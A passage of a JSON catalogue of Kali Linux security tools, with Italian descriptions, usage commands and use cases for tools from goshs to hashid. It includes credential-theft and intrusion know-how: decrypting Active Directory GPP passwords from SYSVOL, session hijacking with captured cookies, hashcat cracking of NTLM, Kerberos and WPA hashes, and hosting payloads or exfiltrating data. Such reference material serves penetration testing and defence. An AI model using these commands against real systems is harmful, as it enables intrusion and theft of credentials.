      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "goshs",
    "name": "goshs",
    "version": "1.1.0",
    "icon": "../app/icons/goshs-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goshs/",
    "desc": "SimpleHTTPServer in Go con upload, WebDAV, SSL e auth per file transfer rapido.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GoSHS (Go Simple HTTP Server) è una versione potenziata di SimpleHTTPServer scritta in Go. Aggiunge funzionalità essenziali per pentesting: upload file, WebDAV, SSL/TLS, autenticazione basic e directory listing. Perfetto per trasferimento file durante engagement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Upload:</strong> Permette upload oltre che download.</p><p><strong>WebDAV:</strong> Supporto WebDAV per mount remoto.</p><p><strong>SSL/TLS:</strong> HTTPS con certificati auto-generati.</p><p><strong>Basic Auth:</strong> Protezione con username/password.</p><p><strong>Cross-Platform:</strong> Binario Go per ogni piattaforma.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server base\ngoshs\n\n# Con upload abilitato\ngoshs -u\n\n# Con SSL\ngoshs -s\n\n# Porta e directory custom\ngoshs -p 8080 -d /path/to/share\n\n# Con autenticazione\ngoshs -U user -P password</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>File Transfer</strong>, scambia file durante pentest. Nel <strong>Payload Hosting</strong>, servi payload al target. <strong>Exfiltration</strong> quando il target può raggiungere il tuo server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Exposure:</strong> Non esporre su internet senza auth. Usa SSL per evitare intercettazione. Log delle connessioni ricevute.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "gospider",
    "name": "gospider",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gospider/",
    "desc": "Web spider veloce in Go per crawling, estrazione link, JS parsing e sitemap discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GoSpider è un web spider veloce scritto in Go per crawling di siti web. Estrae URL da HTML, file JavaScript, sitemap, robots.txt e Wayback Machine. Output pulito e integrabile in pipeline con altri tool per reconnaissance web completa.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Crawling:</strong> Scritto in Go per velocità.</p><p><strong>JS Parsing:</strong> Estrae URL da file JavaScript.</p><p><strong>Sitemap/Robots:</strong> Analizza sitemap.xml e robots.txt.</p><p><strong>Wayback Integration:</strong> Cerca URL storici su Wayback Machine.</p><p><strong>Source Tracking:</strong> Indica la fonte di ogni URL trovato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crawl singolo sito\ngospider -s https://target.com\n\n# Con depth\ngospider -s https://target.com -d 3\n\n# Include Wayback\ngospider -s https://target.com --wayback\n\n# Output file\ngospider -s https://target.com -o output.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Recon</strong>, mappa struttura del sito. Nel <strong>Bug Bounty</strong>, trova endpoint nascosti in JS. <strong>Pentest</strong> per enumerazione URL completa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Crawling genera traffico significativo. Rispetta robots.txt se richiesto. Rate limiting consigliato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "gowitness",
    "name": "gowitness",
    "version": "3.0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gowitness/",
    "desc": "Screenshot tool web in Go con headless Chrome per recon visuale su larga scala.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GoWitness è un tool per catturare screenshot di siti web scritto in Go. Usa headless Chrome per rendering accurato e supporta scansione massiva di URL. Alternativa leggera a EyeWitness con database SQLite per gestione risultati e server web integrato per viewing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Headless Chrome:</strong> Screenshot accurati con rendering completo.</p><p><strong>Mass Scanning:</strong> Processa migliaia di URL.</p><p><strong>SQLite Database:</strong> Archivia risultati in database.</p><p><strong>Web Server:</strong> Visualizza risultati via web interface.</p><p><strong>Nmap Integration:</strong> Processa output di Nmap.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Screenshot singolo\ngowitness single https://target.com\n\n# Da file di URL\ngowitness file -f urls.txt\n\n# Da output nmap\ngowitness nmap -f nmap.xml\n\n# Avvia viewer\ngowitness server</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Visual Recon</strong>, triage rapido di molti web server. Nel <strong>Bug Bounty</strong>, identifica target interessanti visivamente. <strong>Asset Discovery</strong> per documentare web surface.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni HTTP a tutti i target. User-agent identificabile. Richiede Chrome installato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "gpp-decrypt",
    "name": "gpp-decrypt",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gpp-decrypt/",
    "desc": "Decripta password cpassword da Group Policy Preferences (GPP) di Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Gpp-decrypt decripta password memorizzate in Group Policy Preferences (GPP) di Active Directory. Microsoft pubblicava la chiave AES usata per cifrare queste password, rendendole facilmente decriptabili. Vulnerabilità MS14-025, ancora presente in ambienti legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES Decryption:</strong> Decripta cpassword con chiave nota.</p><p><strong>Simple Input:</strong> Accetta stringa cpassword direttamente.</p><p><strong>Fast:</strong> Decryption istantanea.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Decripta cpassword trovata in Groups.xml\ngpp-decrypt \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\"\n\n# Il cpassword si trova in file come:\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n\n# Cerca con:\nfindstr /S /I cpassword \\\\dc\\sysvol\\*.xml</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, recupera password di account locali. Nel <strong>Privilege Escalation</strong>, spesso contiene password di admin locali. <strong>Legacy Systems</strong> potrebbero ancora avere GPP vulnerabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Patched:</strong> MS14-025 ha patchato la creazione di nuovi GPP con password, ma quelli esistenti restano vulnerabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "graudit",
    "name": "graudit",
    "version": "3.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/graudit/",
    "desc": "Static code analysis con grep per trovare vulnerabilità comuni nel codice sorgente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Graudit è un tool di static code analysis che usa grep per trovare vulnerabilità comuni nel codice sorgente. Include database di signature per vari linguaggi (PHP, Python, Java, C, etc.) che identificano pattern vulnerabili come SQL injection, XSS, command injection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language:</strong> Signature per PHP, Python, Java, C, JS, etc.</p><p><strong>Pattern Matching:</strong> Usa grep per ricerca veloce.</p><p><strong>Custom Rules:</strong> Aggiungi signature personalizzate.</p><p><strong>Lightweight:</strong> Nessuna dipendenza complessa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan codice PHP\ngraudit -d php /path/to/code/\n\n# Codice Python\ngraudit -d python /path/to/code/\n\n# Tutti i linguaggi\ngraudit -d all /path/to/code/\n\n# Lista database disponibili\ngraudit -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Code Review</strong>, primo pass automatizzato su codebase. Nel <strong>Bug Bounty</strong>, analisi rapida di codice open source. <strong>DevSecOps</strong> per scansione veloce in pipeline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False Positives:</strong> Pattern matching genera falsi positivi. Richiede review manuale dei risultati. Complementa con tool più sofisticati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "gsocket",
    "name": "gsocket",
    "version": "1.4.43",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gsocket/",
    "desc": "Connessione diretta tra host dietro NAT/firewall senza port forwarding tramite relay.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GSocket (Global Socket) permette connessioni dirette tra host dietro NAT o firewall senza necessità di port forwarding. Usa un relay server per stabilire la connessione iniziale, poi passa a comunicazione diretta. Supporta SSH, reverse shell, file transfer e port forwarding.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NAT Traversal:</strong> Connette host dietro NAT senza port forward.</p><p><strong>Encrypted:</strong> Comunicazione cifrata end-to-end.</p><p><strong>Relay Fallback:</strong> Usa relay se P2P non possibile.</p><p><strong>SSH/Shell:</strong> Shell interattiva e SSH over GSocket.</p><p><strong>File Transfer:</strong> Trasferimento file integrato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera secret condiviso\ngs-netcat -g\n\n# Lato server (listener)\ngs-netcat -l -s SECRET\n\n# Lato client (connector)\ngs-netcat -s SECRET\n\n# Port forwarding\ngs-netcat -l -s SECRET -p 8080:localhost:80</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Remote Access</strong>, accedi a macchine dietro NAT. Nel <strong>Red Team</strong>, mantieni accesso senza aprire porte. <strong>Troubleshooting</strong> per supporto remoto senza VPN.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Relay Traffic:</strong> Il relay potrebbe vedere metadati. Per massima sicurezza, usa relay self-hosted.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "guymager",
    "name": "guymager",
    "version": "0.8.13",
    "icon": "../app/icons/guymager-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/guymager/",
    "desc": "GUI forense per acquisizione immagini disco con hashing, compressione e log chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Guymager è un tool forense con GUI per acquisizione di immagini disco forensi. Supporta formati dd raw, EWF (EnCase) e AFF con hashing parallelo MD5/SHA per verifica integrità. Ottimizzato per velocità con I/O asincrono e multi-threading.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Formats:</strong> dd, EWF/E01, AFF output.</p><p><strong>Parallel Hashing:</strong> Calcola MD5 e SHA simultaneamente.</p><p><strong>Compression:</strong> Compressione integrata per EWF/AFF.</p><p><strong>Verification:</strong> Verifica automatica post-acquisizione.</p><p><strong>Log Generation:</strong> Log dettagliato per chain of custody.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\nguymager\n\n# Seleziona dispositivo sorgente\n# Tasto destro -> Acquire image\n# Scegli formato (Expert Witness preferito per forensics)\n# Specifica destinazione e info caso\n# Avvia acquisizione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, acquisizione forense di dischi. Nel <strong>Incident Response</strong>, crea immagini per analisi. <strong>Chain of Custody</strong> con log e hash verificabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Best Practice:</strong> Usa write blocker hardware. Documenta tutto per chain of custody. Verifica sempre hash post-acquisizione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "gvm",
    "name": "gvm",
    "version": "25.04.0",
    "icon": "../app/icons/gvm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gvm/",
    "desc": "Greenbone Vulnerability Management, scanner di vulnerabilità enterprise open source.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GVM (Greenbone Vulnerability Management, ex OpenVAS) è una piattaforma di vulnerability scanning enterprise open source. Include scanner di rete, database di vulnerabilità aggiornato (NVT), gestione asset, scheduling scan e reporting. Alternativa open source a Nessus/Qualys.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Scanner:</strong> Scansione completa di vulnerabilità di rete.</p><p><strong>NVT Database:</strong> 50,000+ test di vulnerabilità aggiornati.</p><p><strong>Asset Management:</strong> Gestisce inventario asset.</p><p><strong>Scheduled Scans:</strong> Scansioni programmate automatiche.</p><p><strong>Compliance Checks:</strong> Verifica compliance standard.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup iniziale\ngvm-setup\n\n# Avvia servizi\ngvm-start\n\n# Accedi alla web interface\n# https://localhost:9392\n# admin / (password generata)\n\n# Crea target, configura scan, esegui\n# Analizza report generato</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Vulnerability Assessment</strong>, scan completi di infrastruttura. Nel <strong>Compliance</strong>, verifica aderenza a standard. <strong>Continuous Monitoring</strong> con scan schedulati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Resource Intensive:</strong> Richiede risorse significative. Scan possono essere disruptivi. Coordina con operations prima di scansionare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "h8mail",
    "name": "h8mail",
    "version": "2.5.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/h8mail/",
    "desc": "Email OSINT tool per trovare password leakate in breach database e paste site.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>H8mail è un tool OSINT per email che cerca password e credenziali associate a indirizzi email in database di breach e paste site. Interroga servizi come HaveIBeenPwned, Hunter.io, Snusbase e altri per trovare leak associati a un'email target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Cerca in HIBP, breach compilations, paste sites.</p><p><strong>API Integration:</strong> Supporta chiavi API per servizi premium.</p><p><strong>Bulk Search:</strong> Processa liste di email.</p><p><strong>Local Breach:</strong> Cerca in database di breach locali.</p><p><strong>Export:</strong> Output in vari formati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca singola email\nh8mail -t target@email.com\n\n# Lista di email\nh8mail -t emails.txt\n\n# Con API keys configurate\nh8mail -t target@email.com -c config.ini\n\n# Cerca in breach locale\nh8mail -t target@email.com -lb breach.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, verifica se credenziali sono state leakate. Nel <strong>Red Team</strong>, trova password per password spraying. <strong>Security Awareness</strong> mostra rischi di password riutilizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Limits:</strong> Servizi gratuiti hanno rate limiting. API premium costano. Dati di breach possono essere datati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "hak5-wifi-coconut",
    "name": "hak5-wifi-coconut",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hak5-wifi-coconut/",
    "desc": "Driver e tool per WiFi Coconut Hak5 con 14 radio per cattura simultanea su tutti i canali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hak5 WiFi Coconut è un tool hardware/software con 14 radio WiFi che permette cattura simultanea su tutti i canali 2.4GHz. Il pacchetto include driver e utility per gestire le 14 interfacce wireless parallele, ideale per catturare handshake senza dover fare channel hopping.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>14 Radio:</strong> Monitora tutti i canali 2.4GHz simultaneamente.</p><p><strong>No Channel Hopping:</strong> Cattura completa senza perdere pacchetti.</p><p><strong>Airodump Integration:</strong> Funziona con aircrack-ng suite.</p><p><strong>USB Connection:</strong> Singola connessione USB per tutte le radio.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Verifica hardware\nwifi_coconut status\n\n# Avvia tutte le interfacce in monitor mode\nwifi_coconut setup\n\n# Usa con airodump-ng\nairodump-ng wlan0mon wlan1mon wlan2mon ...\n\n# Cattura completa su tutti i canali</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Assessment</strong>, cattura handshake su qualsiasi canale. Nel <strong>Wireless Survey</strong>, mappa tutte le reti simultaneamente. <strong>Research</strong> su traffico WiFi senza perdite.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware Required:</strong> Richiede hardware Hak5 WiFi Coconut (~100$). 14 interfacce possono essere riconosciute.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hamster-sidejack",
    "name": "hamster-sidejack",
    "version": "2.0",
    "icon": "../app/icons/hamster-sidejack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hamster-sidejack/",
    "desc": "Tool per session hijacking che usa cookie catturati da ferret per impersonare utenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hamster è un proxy HTTP per session hijacking che usa cookie catturati da Ferret per impersonare sessioni web. Crea un proxy locale dove puoi navigare come la vittima usando i cookie di sessione catturati dal traffico di rete non cifrato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Session Replay:</strong> Usa cookie catturati per impersonare sessioni.</p><p><strong>Proxy Server:</strong> Proxy HTTP locale per navigazione.</p><p><strong>Ferret Integration:</strong> Legge cookie catturati da Ferret.</p><p><strong>Web Interface:</strong> Interfaccia per selezionare sessioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Prima cattura cookie con Ferret\nferret -i eth0\n\n# Poi avvia Hamster\nhamster\n\n# Configura browser per usare proxy localhost:1234\n# Naviga su http://hamster per selezionare sessione\n# Click su sessione desiderata per impersonare</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Session Hijacking</strong>, impersona utenti su reti non cifrate. Nel <strong>WiFi Testing</strong>, dimostra rischi di reti aperte. <strong>Awareness</strong> sull'importanza di HTTPS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitato:</strong> Non funziona con HTTPS. Richiede posizione MITM. Tool storico, meno utile su internet moderno con HTTPS ovunque.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "hash-identifier",
    "name": "hash-identifier",
    "version": "1.2",
    "icon": "../app/icons/hash-identifier-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hash-identifier/",
    "desc": "Identifica il tipo di algoritmo hash analizzando formato e lunghezza del digest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hash-identifier è un tool Python per identificare il tipo di algoritmo hash analizzando formato, lunghezza e caratteristiche del digest. Utile quando trovi un hash e devi capire quale algoritmo usare per il cracking. Supporta i tipi di hash più comuni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto Detection:</strong> Identifica algoritmo da caratteristiche hash.</p><p><strong>Multiple Matches:</strong> Suggerisce più possibili algoritmi.</p><p><strong>Common Hashes:</strong> MD5, SHA, MySQL, bcrypt, etc.</p><p><strong>Interactive:</strong> Input interattivo dell'hash.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia interattivamente\nhash-identifier\n\n# Inserisci hash quando richiesto\nEnter hash: 5d41402abc4b2a76b9719d911017c592\n\n# Output: Possible Hashs:\n#   MD5\n#   MD4\n#   Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Hash Cracking</strong>, identifica algoritmo prima di usare hashcat/john. Nel <strong>CTF</strong>, riconosci velocemente tipo di hash. <strong>Forensics</strong> per analizzare hash trovati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> hashid è più completo con 220+ algoritmi e suggerimenti hashcat mode. Tool complementari.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashcat-utils",
    "name": "hashcat-utils",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashcat-utils/",
    "desc": "Utility per hashcat: conversione capture, rule generation, wordlist manipulation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hashcat-utils è una collezione di utility per supportare hashcat nel password cracking. Include tool per conversione di capture WiFi, generazione di regole, manipolazione wordlist, combinazione di dizionari e preparazione di file per cracking ottimizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>cap2hccapx:</strong> Converte capture .cap in formato hashcat.</p><p><strong>combinator:</strong> Combina due wordlist in tutte le permutazioni.</p><p><strong>maskprocessor:</strong> Genera wordlist da mask pattern.</p><p><strong>rule utilities:</strong> Tool per creare e testare regole.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti capture WiFi\ncap2hccapx capture.cap output.hccapx\n\n# Combina wordlist\ncombinator wordlist1.txt wordlist2.txt > combined.txt\n\n# Genera da mask\nmaskprocessor ?l?l?l?l > 4letters.txt\n\n# Split per dimensione\nsplitlen 8 wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Cracking</strong>, prepara capture per hashcat. Nel <strong>Wordlist Generation</strong>, crea dizionari custom. <strong>Rule Development</strong> per ottimizzare cracking.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Preprocessing:</strong> Tool di preparazione, non generano traffico. Ottimizza wordlist prima del cracking per risparmiare tempo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashcat",
    "name": "hashcat",
    "version": "6.2.6",
    "icon": "../app/icons/hashcat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashcat/",
    "desc": "Password cracker GPU più veloce al mondo con supporto per 350+ tipi di hash e regole.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hashcat è il password cracker più veloce al mondo, sfruttando GPU per performance estreme. Supporta oltre 350 tipi di hash, attack modes multipli (dictionary, brute-force, combinator, rule-based, mask) e regole per manipolazione password. Standard de facto per password cracking professionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>GPU Acceleration:</strong> Sfrutta CUDA/OpenCL per velocità massima.</p><p><strong>350+ Hash Types:</strong> MD5, SHA, bcrypt, WPA, NTLM, Kerberos, etc.</p><p><strong>Attack Modes:</strong> Dictionary, brute-force, combination, hybrid, mask.</p><p><strong>Rules Engine:</strong> Regole potenti per mutazione password.</p><p><strong>Distributed:</strong> Supporta cracking distribuito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dictionary + rules per massima coverage NTLM\nhashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule \\\n  -r /usr/share/hashcat/rules/toggles1.rule --force -O\n\n# Mask attack: Company + Anno + Simbolo (Corporate passwords)\nhashcat -m 1000 hashes.txt -a 3 'Company?d?d?d?d?s' --increment --increment-min 10\n\n# Combinator: due wordlist concatenate\nhashcat -m 0 hashes.txt -a 1 wordlist1.txt wordlist2.txt\n\n# Kerberoast con ottimizzazione GPU\nhashcat -m 13100 kerberoast.txt wordlist.txt -O -w 3 --hwmon-temp-abort=90\n\n# WPA/WPA2 PMKID con session restore\nhashcat -m 22000 capture.hc22000 wordlist.txt --session=wifi_crack\nhashcat --restore --session=wifi_crack  # riprendi dopo interruzione\n\n# AS-REP Roasting\nhashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/InsidePro-PasswordsPro.rule\n\n# Hybrid: wordlist + mask suffix\nhashcat -m 1000 hashes.txt -a 6 wordlist.txt '?d?d?d?s'\n\n# Show cracked passwords\nhashcat -m 1000 hashes.txt wordlist.txt --show --outfile-format=2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Cracking</strong>, cracka qualsiasi tipo di hash. Nel <strong>Pentest</strong>, verifica strength delle password. <strong>WiFi Cracking</strong> per handshake WPA/WPA2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Local Only:</strong> Cracking avviene localmente, nessun traffico di rete. Richiede GPU potente per performance ottimali. Cloud GPU disponibili per hash complessi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashdeep",
    "name": "hashdeep",
    "version": "4.4",
    "icon": "../app/icons/hashdeep-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashdeep/",
    "desc": "Calcola hash ricorsivamente e verifica integrità file con audit mode per forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hashdeep è un tool forense per calcolare hash ricorsivamente su directory e verificare integrità di file. Supporta MD5, SHA-1, SHA-256 e altri algoritmi. Include audit mode per confrontare hash attuali con baseline nota, identificando file modificati, aggiunti o rimossi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Recursive Hashing:</strong> Calcola hash di intere directory.</p><p><strong>Multiple Algorithms:</strong> MD5, SHA-1, SHA-256, Tiger, Whirlpool.</p><p><strong>Audit Mode:</strong> Confronta con baseline per trovare modifiche.</p><p><strong>Matching Mode:</strong> Cerca file con hash specifici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera baseline di hash\nhashdeep -r /path/to/directory > baseline.txt\n\n# Verifica integrità (audit)\nhashdeep -r -a -k baseline.txt /path/to/directory\n\n# Solo SHA-256\nhashdeep -r -c sha256 /path/to/evidence/\n\n# Cerca file matching\nhashdeep -r -m -k known_hashes.txt /suspect/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, verifica integrità evidenze. Nel <strong>Incident Response</strong>, trova file modificati. <strong>Compliance</strong> per audit integrità sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only:</strong> Solo lettura, non modifica file. Crea baseline PRIMA di analizzare per confronto valido.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "hashid",
    "name": "hashid",
    "version": "3.1.4",
    "icon": "../app/icons/hashid-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashid/",
    "desc": "Identifica oltre 220 tipi di hash e suggerisce il modulo hashcat corrispondente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HashID identifica oltre 220 tipi di hash e suggerisce direttamente il modulo hashcat (-m) e john format corrispondente. Più completo di hash-identifier, è il tool preferito per identificare algoritmi hash sconosciuti prima del cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>220+ Algorithms:</strong> Identifica moltissimi tipi di hash.</p><p><strong>Hashcat Mode:</strong> Suggerisce direttamente il parametro -m.</p><p><strong>John Format:</strong> Indica il format per John the Ripper.</p><p><strong>Batch Mode:</strong> Processa file con più hash.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Identifica singolo hash\nhashid '5d41402abc4b2a76b9719d911017c592'\n\n# Con moduli hashcat e john\nhashid -m -j '5d41402abc4b2a76b9719d911017c592'\n\n# Da file\nhashid -m hashes.txt\n\n# Output esteso\nhashid -e '$2a$10$...'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Hash Cracking</strong>, identifica tipo prima di usare hashcat. Nel <strong>CTF</strong>, riconosci algoritmi velocemente. <strong>Pentest</strong> per capire come sono hash ate le password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> Analisi locale, nessuna connessione di rete. Alcuni hash sono ambigui, prova più moduli hashcat se necessario.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
